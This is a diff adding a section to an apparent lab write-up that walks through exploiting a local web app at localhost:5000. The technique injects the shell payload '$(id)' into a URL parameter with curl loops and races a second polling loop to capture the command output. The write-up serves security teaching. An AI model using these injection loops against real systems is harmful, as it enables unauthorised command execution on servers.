@@ -57,6 +57,78 @@ Go to terminal and stop the loop with ctrl_c and if you to the begging you can s
 
 ![](../../Images/Pasted%20image%2020230906165756.png)
 
+But how we can do this if we haven't the files?
+
+````bash
+while true; do curl -s -X GET 'http://localhost:5000/?action=run' | grep -i "Check this out" | html2text | xargs; done
+
+# Genereated by S4vitaar
+````
+
+You have to send the information in the website, in my case I don't change the name `Default User`
+
+Click on **Make it mine!**
+
+In terminal you have to see this:
+
+![](../../Images/Pasted%20image%2020230906170800.png)
+
+Now we are going to hide the output that contain `Default User`:
+
+````bash
+while true; do curl -s -X GET 'http://localhost:5000/?action=run' | grep -i "Check this out" | html2text | xargs | grep -v "Default User"; done
+````
+
+Now you need to copy the url when put the name, the URL be like:
+
+![](../../Images/Pasted%20image%2020230906171009.png)
+
+````bash
+http://localhost:5000/?person=Default+User&action=validate
+````
+
+In other terminal you have to use curl command, but change the `Default User` by `$(id)`:
+
+````bash
+curl -s -X 'http://localhost:5000/?person=$(id)&action=validate'
+````
+
+**Important** --> You have to use single quotes in url because the $(id) would be interpreted by your own machine and this is not interest us
+
+Now we are going to put this command in a while loop:
+
+````bash
+while true; do curl -s -X 'http://localhost:5000/?person=$(id)&action=validate'; done
+````
+
+After running this command you have to have the after command executing, you have to execute this command in a terminal:
+
+````bash
+while true; do curl -s -X GET 'http://localhost:5000/?action=run' | grep -i "Check this out" | html2text | xargs | grep -v "Default User"; done
+````
+
+and the last in other terminal:
+
+````bash
+while true; do curl -s -X GET 'http://localhost:5000/?person=$(id)&action=validate'; done
+````
+
+We can see a lot of unnecessary output:
+
+![](../../Images/Pasted%20image%2020230906171733.png)
+
+We can delete this from our output:
+
+````bash
+while true; do curl -s -X GET 'http://localhost:5000/?action=run' | grep "Check this out" | html2text | xargs | grep -vE "pepe|Important|Default User"; done
+````
+
+As I am somewhat impatient I change the name and put `pepe` and I have to change a little the loop 
+
+You have to wait and you can see the result:
+
+![](../../Images/Pasted%20image%2020230906182544.png)
+
 
 
 ---
